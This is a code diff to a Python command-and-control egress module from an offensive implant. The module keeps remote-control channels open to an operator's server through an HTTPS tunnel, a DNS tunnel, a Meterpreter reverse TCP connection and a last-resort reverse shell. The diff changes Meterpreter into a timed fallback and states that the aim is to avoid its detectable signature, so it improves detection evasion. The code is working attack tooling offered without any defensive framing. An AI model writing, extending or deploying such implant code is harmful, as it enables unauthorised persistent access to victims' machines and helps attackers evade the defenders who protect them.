@@ -2,15 +2,16 @@
 """C2 egress — parallel multi-method connections.
 
 Establishes command-and-control channels back to the operator's
-infrastructure.  All enabled methods run simultaneously, each in its
-own management thread with automatic health monitoring and restart:
+infrastructure.  Primary methods run simultaneously; meterpreter
+is held back as a fallback to avoid its detectable signature:
 
-    1. Chisel HTTPS tunnel  — WebSocket/TLS on 443 (primary)
-    2. DNS Tunnel (iodine)  — UDP/53
-    3. Python Meterpreter   — reverse TCP on 4443/8443
+    1. Chisel HTTPS tunnel  — WebSocket/TLS on 443 (primary, parallel)
+    2. DNS Tunnel (iodine)  — UDP/53 (primary, parallel)
+    3. Python Meterpreter   — reverse TCP on 4443/8443 (fallback only)
 
-Reverse shell is a last resort — attempted only when all three
-parallel methods stay failed for 5 minutes.
+Meterpreter only attempts after both primaries have failed for
+120 seconds (configurable).  Reverse shell is a last resort —
+attempted only when all methods stay failed for 5 minutes.
 
 Legacy sequential cascade (run_cascade) is still available.
 """
@@ -1381,6 +1382,32 @@ def _manage_dns_tunnel(config):
             _parallel_shutdown.wait(retry_delay)
 
 
+def _meterpreter_alive():
+    if _meterpreter_socket is None:
+        return False
+    return _check_socket_health(_meterpreter_socket)
+
+
+def _port_reachable(host, port, timeout=5):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((host, port))
+        s.close()
+        return True
+    except Exception:
+        return False
+
+
+def _primaries_connected():
+    with _method_states_lock:
+        for name in ("chisel", "dns_tunnel"):
+            entry = _method_states.get(name)
+            if entry and entry["state"] == "connected":
+                return True
+    return False
+
+
 def _manage_meterpreter(config):
     c2_host = config["c2"]["host"]
     c2_ports = config["c2"]["ports"]
@@ -1397,8 +1424,56 @@ def _manage_meterpreter(config):
     if proxy_host and proxy_port:
         proxy = (proxy_host, proxy_port)
 
+    fallback_delay = met_cfg.get("fallback_delay", 120)
     retry_delay = 60
+    primaries_failed_since = None
+
     while not _parallel_shutdown.is_set():
+        if _primaries_connected():
+            _update_method_state("meterpreter", "standby")
+            primaries_failed_since = None
+            _parallel_shutdown.wait(15)
+            continue
+
+        if primaries_failed_since is None:
+            primaries_failed_since = time.monotonic()
+            log.info("Primary C2 methods down — meterpreter fallback "
+                     "in %ds if no recovery", fallback_delay)
+            _update_method_state("meterpreter", "waiting")
+
+        elapsed = time.monotonic() - primaries_failed_since
+        if elapsed < fallback_delay:
+            _parallel_shutdown.wait(10)
+            continue
+
+        log.warning("Primaries failed for %ds — checking meterpreter ports",
+                    int(elapsed))
+
+        reachable_port = None
+        try:
+            c2_ip = socket.gethostbyname(c2_host)
+        except socket.gaierror:
+            log.warning("Cannot resolve %s — skipping meterpreter attempt",
+                        c2_host)
+            _update_method_state("meterpreter", "failed")
+            if not _parallel_shutdown.is_set():
+                _parallel_shutdown.wait(retry_delay)
+            continue
+
+        for port in c2_ports:
+            if _port_reachable(c2_ip, port):
+                reachable_port = port
+                break
+
+        if reachable_port is None:
+            log.info("No meterpreter ports reachable on %s — skipping",
+                     c2_ip)
+            _update_method_state("meterpreter", "failed")
+            if not _parallel_shutdown.is_set():
+                _parallel_shutdown.wait(retry_delay)
+            continue
+
+        log.info("Port %d reachable — attempting meterpreter", reachable_port)
         _update_method_state("meterpreter", "attempting")
         result = try_meterpreter(
             c2_host, c2_ports,
@@ -1407,7 +1482,21 @@ def _manage_meterpreter(config):
             proxy=proxy,
             tunnel_cfg=tunnel_cfg,
         )
-        _update_method_state("meterpreter", "failed")
+        if result:
+            primaries_failed_since = None
+            while not _parallel_shutdown.is_set():
+                _parallel_shutdown.wait(10)
+                if _parallel_shutdown.is_set():
+                    break
+                if _primaries_connected():
+                    log.info("Primary C2 recovered — meterpreter "
+                             "returning to standby")
+                    break
+                if not _meterpreter_alive():
+                    log.warning("Meterpreter connection lost")
+                    break
+        else:
+            _update_method_state("meterpreter", "failed")
         if not _parallel_shutdown.is_set():
             _parallel_shutdown.wait(retry_delay)
 
